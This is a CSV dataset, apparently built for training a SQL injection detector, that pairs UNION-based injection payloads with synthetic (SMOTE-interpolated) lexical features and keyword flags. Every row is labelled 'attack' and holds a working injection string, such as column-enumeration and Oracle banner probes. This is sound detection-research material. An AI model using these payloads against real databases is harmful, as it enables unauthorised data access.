id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000057,0.2931898446344378,85.54781331892217,27.0,3.995532845107173,25.0,28.43825065513773,22.0,10.109562663784432,0.29426735807806603,0.3291722270750943,0.25895527510869815,0.1176051397381415,0.0,1.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,2.0,0.0,3.469446951953614e-18,3.1095626637844327,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000002,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,0.8913819213408617,78.13321443815639,28.311130926973938,4.317626606215101,29.0,22.755476292104255,15.0,11.377738146052128,0.37164472656984204,0.2907501616305046,0.19223003098440106,0.1453750808152523,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,1.6888690730260638,5.688869073026064,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.6888690730260638,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000003,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000039,0.5553943287794304,38.52353727245882,19.73354658472305,3.90956162123042,15.589350933566612,9.95612422592814,8.366773292361525,4.611288820602544,0.4079156627700254,0.24785415306623287,0.2254689286498017,0.11876125551394001,0.1222577641205087,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,0.4890310564820348,3.0,0.1222577641205087,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000004,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000059,0.8500535838464152,38.74241712344244,20.31439571913939,4.067294837746372,14.0,14.74241712344244,4.0,6.0,0.362226500188754,0.37904028539070733,0.10349328576821544,0.15523992865232317,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.3143957191393898,3.469446951953614e-18,1.68560428086061,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000005,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000033,0.13937839740555885,98.24234454608401,27.0,4.023947710871493,25.242344546084016,44.0,15.939413863478997,13.060586136521003,0.25687186393198613,0.4479128491368851,0.16228341795554194,0.13293186897558687,1.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,7.0,4.060586136521004,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0605861365210039,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.060586136521004
SMOTE_000006,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000026,0.5722455532376641,106.03019241122877,27.32326919625708,4.052163645597565,29.0,46.70692321497168,15.0,15.32326919625708,0.27355539360840814,0.44034791051967914,0.1414941691077973,0.14460252676411536,1.6465383925141572,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,7.676730803742922,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000007,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000025,0.7508188898202821,100.42031249694601,27.789843751527,3.758099148160244,25.84062499389201,40.84062499389201,20.52890626068898,13.210156248473002,0.25721124382015204,0.4065931372069962,0.20467095599373392,0.13152466297911786,1.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.7898437515269974,0.0,3.469446951953614e-18,6.210156248473003,4.210156248473003,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.2101562484730026,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2101562484730026
SMOTE_000008,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000050,0.9847449366777764,95.17731906496411,26.274226978345297,4.068691945377263,26.451546043309406,42.90309208661881,12.371134891726483,13.451546043309406,0.27784059200309946,0.4505930557187483,0.1303403270487385,0.14122602522941372,1.0,0.0,3.0,0.0,0.0,0.27422697834529647,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,8.17731906496411,3.2742269783452964,1.0,0.0,1.0,0.0,0.0,0.2742269783452965,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.2742269783452965,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2742269783452964
SMOTE_000009,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000003,2.031909724643725,107.95329012388339,27.100731138640754,4.019069409244597,66.0,4.0,28.402924554563008,9.550365569320377,0.6124378338959515,0.03711744447854248,0.26201649325128196,0.08842822837422402,0.0,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,1.1007311386407521,0.0,3.469446951953614e-18,1.0,6.449634430679624,0.0,0.0,1.0,0.0,0.0,1.0,0.5503655693203762,3.469446951953614e-18,0.0,0.0,0.44963443067962394,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000010,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000035,1.1937815556800342,64.42796603978763,20.314406792042472,3.6981666452435533,14.0,34.74237283183011,4.0,11.685593207957528,0.21758779817262122,0.5388946421928544,0.06216794233503463,0.18134961729948962,0.6855932079575282,0.3144067920424718,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,6.6855932079575275,3.0,0.6855932079575282,0.31440679204247174,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000011,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,0.2133620049698136,102.0,25.110536726832162,4.035099829437956,66.0,4.0,24.0,8.0,0.6470588235294118,0.039215686274509776,0.23529411764705882,0.0784313725490196,0.0,0.0,2.0,0.0,1.8894632731678387,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000012,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,0.05810021245908187,79.58354351605806,28.0,4.309580514847272,29.0,23.666834812846446,15.0,11.916708703211611,0.3645128730057194,0.29722362344038705,0.18854114120985485,0.1497223623440387,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,1.9167087032116117,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000013,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000078,0.21627804066997086,92.37280996393257,27.837280996393257,4.174055792050818,29.0,34.69824797114605,15.0,13.674561992786513,0.31448689349619496,0.37490047499824675,0.16266563456699742,0.1479469969385608,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,4.674561992786513,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000014,attack,union,"-2314%'   )    )    union all select 4612,4612--",nearest_attack_euclidean,R000023,0.31906989924082113,48.98711736455385,21.15186420993136,3.828846443862486,14.987117364553852,12.303728419862722,13.772203685102957,7.9240678950343195,0.30312909508020186,0.25093359145449606,0.28321247738428557,0.16272483608101657,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.924067895034319,0.9240678950343191,3.469446951953614e-18,1.075932104965681,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000015,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000033,0.2996982112304706,98.25231311991547,27.126156559957735,3.9734110391922814,25.0,43.49537376016906,16.756939359746408,13.0,0.25445838489817485,0.4428004950224783,0.17042275993229594,0.13231836014705092,1.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.1261565599577346,0.0,3.469446951953614e-18,6.873843440042265,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000016,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,0.04823404008140517,83.83829360057028,27.0,4.122547263950349,28.941197672934646,27.94119767293465,15.014700581766338,11.941197672934646,0.34519734020058257,0.33326620738919477,0.17916837000323194,0.1423680824069907,2.9705988364673233,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.9852994182336614,4.985299418233661,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.9852994182336614,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.985299418233662
SMOTE_000017,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000003,2.49936907568004,106.83709292760929,27.655806195173952,3.905079661348487,60.148705317957194,3.655806195173952,32.34419380482605,10.688387609652096,0.5603283194393402,0.03406681904906528,0.30447006005679494,0.10113480145479951,0.0,0.3441938048260479,2.0,0.0,1.0,1.6558061951739522,3.469446951953614e-18,2.6883876096520956,0.0,3.469446951953614e-18,1.0,5.3116123903479044,0.0,0.3441938048260479,1.0,0.344193804826048,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.655806195173952,1.655806195173952,3.469446951953614e-18,0.3441938048260479,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.655806195173952
